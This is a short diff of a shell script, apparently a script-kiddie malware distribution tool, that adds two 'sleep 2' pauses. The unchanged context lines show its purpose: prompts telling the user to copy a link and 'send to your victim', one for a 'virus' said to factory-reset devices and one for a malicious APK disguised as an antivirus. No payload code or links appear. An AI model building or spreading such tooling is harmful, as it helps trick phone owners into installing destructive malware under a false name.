@@ -30,6 +30,7 @@ then
 clear
 figlet -f slant "wait....."|lolcat
 clear
+sleep 2
 echo " "
 echo ' Copy below link and send to your victim
   this virus can do factory reset and many much harm'|lolcat
@@ -47,6 +48,7 @@ then
 clear
 figlet -f slant "wait...."|lolcat
 clear
+sleep 2
 echo 'copy below link and send to your victim
            it is a antivirus apk '|lolcat
            echo " "
